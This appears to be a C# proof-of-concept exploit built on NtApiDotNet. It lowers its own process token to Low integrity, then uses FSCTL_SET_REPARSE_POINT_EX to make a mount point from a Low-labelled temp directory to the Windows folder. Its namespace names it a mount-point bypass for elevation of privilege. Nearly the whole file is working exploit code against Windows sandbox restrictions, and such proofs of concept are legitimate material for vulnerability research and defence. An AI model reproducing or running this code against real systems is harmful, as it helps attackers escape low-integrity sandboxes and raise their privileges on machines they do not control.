using NtApiDotNet;
using System;
using System.IO;
//====Built by Segregator====//
namespace PoC_MountPointBypass_Ex_EoP
{
    class Program
    {
        static string CreateDir()
        {
            string temp_path = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString());
            Directory.CreateDirectory(temp_path);
            using (var file = NtFile.Open(NtFileUtils.DosFileNameToNt(temp_path), null, FileAccessRights.WriteOwner))
            {
                var sd = new SecurityDescriptor
                {
                    IntegrityLevel = TokenIntegrityLevel.Low
                };
                file.SetSecurityDescriptor(sd, SecurityInformation.Label);
                return temp_path;
            }
        }

        static byte[] BuildReparseBuffer(string target)
        {
            MountPointReparseBuffer buffer = new MountPointReparseBuffer(NtFileUtils.DosFileNameToNt(target), target);
            MemoryStream stm = new MemoryStream();
            BinaryWriter writer = new BinaryWriter(stm);
            // Flags.
            writer.Write(0);
            // Existing tag.
            writer.Write(0);
            writer.Write(Guid.Empty.ToByteArray());
            // Reserved.
            writer.Write(0UL);
            writer.Write(buffer.ToByteArray());
            return stm.ToArray();
        }

        static void Main(string[] args)
        {
            try
            {
                string dir = CreateDir();
                Console.WriteLine("Created {0} to test mount point bypass", dir);
                using (var token = NtToken.OpenProcessToken())
                {
                    Console.WriteLine("Lowering token to Low IL");
                    token.SetIntegrityLevel(TokenIntegrityLevel.Low);
                }

                using (var file = NtFile.Open(NtFileUtils.DosFileNameToNt(dir), null,
                    FileAccessRights.GenericRead | FileAccessRights.GenericWrite,
                    FileShareMode.None, FileOpenOptions.OpenReparsePoint | FileOpenOptions.DirectoryFile))
                {
                    Console.WriteLine("Opened {0}", file.FullPath);
                    byte[] buffer = BuildReparseBuffer(Environment.GetFolderPath(Environment.SpecialFolder.Windows));
                    file.FsControl(NtWellKnownIoControlCodes.FSCTL_SET_REPARSE_POINT_EX, buffer, 0);
                    MountPointReparseBuffer rp = (MountPointReparseBuffer)file.GetReparsePoint();
                    Console.WriteLine("Set Mount Point: {0} {1}", rp.Tag, rp.SubstitutionName);
                    Console.ReadLine();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
                Console.ReadLine();
            }
        }
    }
}
